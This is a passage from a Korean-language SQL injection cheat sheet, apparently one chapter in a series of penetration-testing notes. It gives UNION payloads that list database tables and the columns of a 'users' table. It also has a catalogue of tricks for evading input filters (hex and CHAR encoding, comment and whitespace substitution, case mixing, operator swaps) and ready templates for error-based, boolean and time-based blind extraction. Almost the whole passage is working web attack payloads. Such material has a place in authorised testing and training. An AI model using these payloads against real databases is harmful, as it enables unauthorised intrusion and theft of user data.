' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables WHERE table_schema=DATABASE()--

-- 모든 컬럼
' UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name='users'--
```

### 16.2 필터 우회 치트시트

```sql
-- Quote 우회
0x61646D696E              -- 'admin' (Hex)
CHAR(97,100,109,105,110)  -- 'admin' (CHAR)

-- Space 우회
/**/                      -- 주석
%09, %0A, %0B, %0C, %0D   -- 공백 문자
()                        -- 괄호

-- Keyword 우회
SeLeCt, SELE/**/CT        -- Case, 주석
/*!50000SELECT*/          -- 버전 주석

-- AND/OR 우회
&&, ||                    -- 연산자
%26%26, %7C%7C            -- URL 인코딩

-- = 우회
LIKE, REGEXP, RLIKE       -- 비교 대체
<>, !=                    -- 부정
BETWEEN x AND x           -- 범위

-- Comment 우회
-- (공백필요), #, /* */   -- 주석 유형
NULL 바이트 %00           -- 문자열 종료
```

### 16.3 데이터 추출 템플릿

```sql
-- Union-based 템플릿
' UNION SELECT 1,{payload},3--

-- Error-based 템플릿
' AND EXTRACTVALUE(1,CONCAT(0x7e,({payload})))--
' AND UPDATEXML(1,CONCAT(0x7e,({payload})),1)--

-- Boolean-based 템플릿
' AND ASCII(SUBSTRING(({payload}),{pos},1))>{mid}--

-- Time-based 템플릿
' AND IF(ASCII(SUBSTRING(({payload}),{pos},1))>{mid},SLEEP(5),0)--
```

---

> **이전 문서**: 02_Bypass_Techniques.md
> **다음 문서**: 04_DBMS_PostgreSQL.md
